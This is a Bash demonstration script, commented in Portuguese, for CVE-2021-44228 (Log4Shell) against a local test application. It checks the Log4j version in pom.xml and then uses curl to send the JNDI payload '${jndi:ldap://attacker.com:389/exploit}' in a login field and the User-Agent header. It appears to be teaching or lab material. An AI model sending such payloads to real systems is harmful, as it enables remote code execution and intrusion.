#!/bin/bash

# Script para demonstrar dependência vulnerável Log4j
# ⚠️  APENAS PARA FINS EDUCATIVOS ⚠️

echo "========================================"
echo "VULNERABILIDADE: LOG4J VULNERÁVEL"
echo "========================================"
echo

BASE_URL="http://localhost:8080"

echo "🔴 DEMONSTRAÇÃO: CVE-2021-44228 (Log4Shell)"
echo

# 1. Verificar versão vulnerável no pom.xml
echo "1️⃣  Dependência vulnerável detectada"
echo "-----------------------------------"
LOG4J_VERSION=$(grep -A 2 "log4j-core" ../pom.xml | grep "<version>" | sed 's/.*<version>\(.*\)<\/version>.*/\1/' | tr -d ' ')

if [ ! -z "$LOG4J_VERSION" ]; then
    echo "📍 Log4j versão: $LOG4J_VERSION"
    if [[ "$LOG4J_VERSION" < "2.15.0" ]]; then
        echo "💥 VULNERÁVEL ao CVE-2021-44228"
    else
        echo "✅ Versão não vulnerável"
    fi
else
    echo "⚠️  Log4j não encontrado no pom.xml"
fi
echo

# 2. Enviar payload Log4Shell
echo "2️⃣  Enviando payload Log4Shell"
echo "-----------------------------"
PAYLOAD='${jndi:ldap://attacker.com:389/exploit}'
echo "Payload: $PAYLOAD"
echo

echo "Comando:"
echo "curl -X POST '$BASE_URL/api/auth/login' -d '{\"cpf\":\"$PAYLOAD\",\"senha\":\"teste\"}'"
echo

curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -H "User-Agent: $PAYLOAD" \
  -d "{\"cpf\":\"$PAYLOAD\",\"senha\":\"teste\"}" > /dev/null

echo "✅ Payload enviado para os logs"
echo

# 3. Resultado da demonstração
echo "3️⃣  Resultado da demonstração"
echo "----------------------------"
if [ ! -z "$LOG4J_VERSION" ] && [[ "$LOG4J_VERSION" < "2.15.0" ]]; then
    echo "🔴 Log4j $LOG4J_VERSION processou o payload!"
    echo
    echo "📋 VERIFICAR NO CONSOLE DA APLICAÇÃO:"
    echo "Procure por: 'Error looking up JNDI resource [ldap://attacker.com:389/exploit]'"
    echo
    echo "💥 VULNERABILIDADE CONFIRMADA:"
    echo "• Log4j tentou fazer lookup JNDI"
    echo "• Conexão falhou porque o servidor não existe"
    echo "• Com servidor real, código malicioso seria executado"
    echo
    echo "📚 Demonstração bem-sucedida do CVE-2021-44228"
else
    echo "🟡 Versão não vulnerável ou não detectada"
fi

echo "========================================"
echo "   LOG4J VULNERÁVEL - DEMONSTRAÇÃO"
echo "========================================"